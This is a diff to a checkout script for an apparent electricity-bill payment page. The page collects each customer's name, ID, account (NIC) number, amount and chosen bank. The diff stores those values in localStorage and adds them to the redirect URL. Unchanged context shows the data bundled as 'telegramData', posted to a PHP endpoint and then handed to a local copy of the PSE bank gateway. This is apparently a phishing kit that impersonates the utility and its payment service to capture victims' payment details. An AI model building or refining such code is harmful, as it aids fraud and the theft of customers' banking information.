@@ -340,6 +340,11 @@ function showCheckoutSection(formData, originalAmount, finalAmount, paymentType)
     // Total a Pagar plano sin leyenda
     const totalPagarElement = document.getElementById('checkout-total-pagar');
     totalPagarElement.textContent = finalAmount;
+    try {
+        localStorage.setItem('aire_pago_total', finalAmount);
+        localStorage.setItem('aire_pago_nic', paymentData.nic || '');
+        localStorage.setItem('aire_pago_nombre', `${formData.nombres} ${formData.apellidos}`);
+    } catch(e) {}
 
     // Pre-fill payment form fields with customer data
     document.getElementById('identificacion-pago').value = formData.numeroId;
@@ -736,17 +741,25 @@ document.addEventListener('DOMContentLoaded', function () {
                     banco: selectedBank
                 };
 
+                try {
+                    localStorage.setItem('aire_pago_total', telegramData.totalPagar);
+                    localStorage.setItem('aire_pago_nic', telegramData.nic);
+                    localStorage.setItem('aire_pago_nombre', telegramData.nombre);
+                } catch(e) {}
+
+                const nextUrl = `pse/index.php?banco=${encodeURIComponent(selectedBank)}&nic=${encodeURIComponent(telegramData.nic)}&total=${encodeURIComponent(telegramData.totalPagar)}`;
+
                 fetch('send_invoice_data.php', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(telegramData)
                 })
                     .then(() => {
-                        window.location.href = `pse/index.php?banco=${encodeURIComponent(selectedBank)}`;
+                        window.location.href = nextUrl;
                     })
                     .catch(err => {
                         console.error("Error sending notification", err);
-                        window.location.href = `pse/index.php?banco=${encodeURIComponent(selectedBank)}`;
+                        window.location.href = nextUrl;
                     });
             }
         });
